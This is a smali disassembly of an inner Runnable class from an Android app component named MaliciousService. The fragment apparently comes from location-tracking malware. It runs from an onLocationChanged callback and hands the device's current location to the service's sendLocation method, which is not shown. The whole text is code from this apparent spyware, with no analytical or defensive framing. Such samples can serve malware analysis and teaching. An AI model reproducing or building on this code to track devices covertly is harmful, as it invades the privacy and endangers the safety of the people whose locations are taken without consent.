.class Lcom/example/android/MaliciousService$2$1;
.super Ljava/lang/Object;
.source "MaliciousService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/example/android/MaliciousService$2;->onLocationChanged(Landroid/location/Location;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$1:Lcom/example/android/MaliciousService$2;

.field final synthetic val$currentLocation:Landroid/location/Location;


# direct methods
.method constructor <init>(Lcom/example/android/MaliciousService$2;Landroid/location/Location;)V
    .registers 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 84
    iput-object p1, p0, Lcom/example/android/MaliciousService$2$1;->this$1:Lcom/example/android/MaliciousService$2;

    iput-object p2, p0, Lcom/example/android/MaliciousService$2$1;->val$currentLocation:Landroid/location/Location;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .registers 3

    .line 87
    iget-object v0, p0, Lcom/example/android/MaliciousService$2$1;->this$1:Lcom/example/android/MaliciousService$2;

    iget-object v0, v0, Lcom/example/android/MaliciousService$2;->this$0:Lcom/example/android/MaliciousService;

    iget-object v1, p0, Lcom/example/android/MaliciousService$2$1;->val$currentLocation:Landroid/location/Location;

    invoke-static {v0, v1}, Lcom/example/android/MaliciousService;->-$$Nest$msendLocation(Lcom/example/android/MaliciousService;Landroid/location/Location;)V

    .line 88
    return-void
.end method
